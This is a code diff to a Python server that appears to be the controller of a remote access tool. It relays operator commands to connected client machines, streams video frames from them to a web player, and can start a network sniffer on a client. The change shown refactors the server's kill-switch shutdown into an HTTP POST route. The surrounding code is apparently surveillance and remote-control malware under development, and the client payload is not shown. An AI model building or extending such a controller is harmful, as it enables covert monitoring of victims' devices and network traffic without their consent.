@@ -5,19 +5,14 @@ from flask import Flask, Response, request
 from colorama import Fore, Style, init
 import cv2
 import numpy as np
-import sys
-import os
 
 init(autoreset=True)
 
 app = Flask(__name__)
 clients = {}
 server_thread = None
-flask_thread = None
-shutdown_flag = threading.Event()
 
 def start_streaming(client_socket, mode):
-    global flask_thread
     print(Fore.BLUE + "[ * ] Starting...")
     time.sleep(1)
     print(Fore.BLUE + "[ * ] Preparing player...")
@@ -28,12 +23,22 @@ def start_streaming(client_socket, mode):
         return Response(generate_frames(client_socket),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
 
+    @app.route('/k', methods=['POST'])
+    def kill_server():
+        shutdown_server()
+        return 'Server shutting down...'
+
     print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
 
     # Run the Flask app in a separate thread to handle the streaming
-    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False))
-    flask_thread.start()
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
+
+def shutdown_server():
+    func = request.environ.get('werkzeug.server.shutdown')
+    if func is None:
+        raise RuntimeError('Not running with the Werkzeug Server')
+    func()
 
 def generate_frames(client_socket):
     while True:
@@ -58,11 +63,6 @@ def handle_client(client_socket, addr):
 
         print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
         client_socket.send(command.encode('utf-8'))
-
-        if command == "k":
-            print(Fore.RED + "[ * ] Kill switch activated. Stopping Flask server...")
-            shutdown_flask_server()
-            continue
 
         if command == "sniffer_start":
             print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
@@ -121,18 +121,6 @@ def handle_client(client_socket, addr):
             continue
 
         client_socket.send(command.encode('utf-8'))
-
-def shutdown_flask_server():
-    shutdown_flag.set()
-
-@app.before_first_request
-def register_shutdown():
-    def shutdown():
-        shutdown_flag.wait()
-        func = request.environ.get('werkzeug.server.shutdown')
-        if func:
-            func()
-    threading.Thread(target=shutdown).start()
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
